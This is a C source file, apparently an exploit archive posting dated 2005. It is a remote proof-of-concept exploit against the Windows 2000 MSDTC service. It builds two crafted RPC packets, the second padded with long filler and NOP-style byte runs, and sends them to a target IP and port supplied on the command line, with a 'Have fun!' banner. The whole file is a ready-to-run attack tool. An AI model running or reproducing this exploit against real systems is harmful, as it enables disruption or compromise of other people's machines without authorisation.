/*
\             MSDTC remote PoC exploit
/                   by Darkeagle
\
/
\              Unl0ck Research Team
/
\
/  Greetingz:  all UKT boys, 0x557 guys, Sowhat, GHC/RST guys
\
/  Exploit tested on: Windows 2000 Professional Russian Service Pack 4
\
/  http://exploiterz.org || http://55k7.org
\
/  Reference: http://security.nnov.ru/Jdocument906.html
\
/  ."by default on all Windows 2000 systems."
\  it's false: by default in my system msdtc service turned off.
*/

#include <stdio.h>
#include <string.h>
#include <winsock.h>
#include <windows.h>

unsigned char packet1[] =
"\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00"
"\x00\x00\x01\x00\x00\x00\xd0\x16\xd0\x16\x00\x00\x00\x00\x01\x00"
"\x00\x00\x00\x00\x01\x00\xe0\x0c\x6b\x90\x0b\xc7\x67\x10\xb3\x17"
"\x00\xdd\x01\x06\x62\xda\x01\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c"
"\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60\x02\x00\x00\x00";

unsigned char packet2[] =
"\x05\x00\x00\x03\x10\x00\x00\x00\x04\x01"
"\x00\x00\x01\x00\x00\x00\xec\x00\x00\x00\x00\x00\x07\x00"
"\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x25\x00\x00\x00\x00\x00"
"\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00"
"\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00"
"\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00"
"\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00"
"\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00"
"\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00"
"\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00"
"\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00"
"\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00"
"\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00"
"\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00"
"\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00"
"\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00"
"\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00"
"\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00"
"\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00\x55\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00";

int banner (char *proga)
{
    system("cls");
    printf("** MSDTC remote PoC Exploit **\n");
    printf("         by Darkeagle       \n");
    printf("\nUse: %s <ip> <port>\n", proga);
    printf("Default port: 3372\n");
    printf("Have fun!\n");
}

int main ( int argc, char *argv[] )
{
    SOCKET sock;
    WSADATA wsa;
    struct sockaddr_in addr;
    int port;
    char *ip_addr;

    if ( argc < 3 ) { banner(argv[0]); exit(0); }
    
    
    banner(argv[0]);
    
    port = atoi(argv[2]);
    ip_addr = argv[1];
    
    printf("[] preparing..\n");
    
    WSAStartup(MAKEWORD(2,0), &wsa);
    
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip_addr);
    
    printf("[] connecting..\n");
    
    if ( connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == -1 )
    { printf("[-] connection failed!\n"); exit(0); }
    
    printf("[] sending crafted packet...");
    if ( send(sock, packet1, sizeof(packet1), 0) == -1 )
    { printf("[-] send failed!\n"); exit(0); }
    
    if ( send(sock, packet2, sizeof(packet2), 0) == -1 )
    { printf("[-] send failed!\n"); exit(0); }
    
    printf("ok!\n");
    
    closesocket(sock);
    WSACleanup();
    return 0;
    
}

// milw0rm.com [2005-11-27]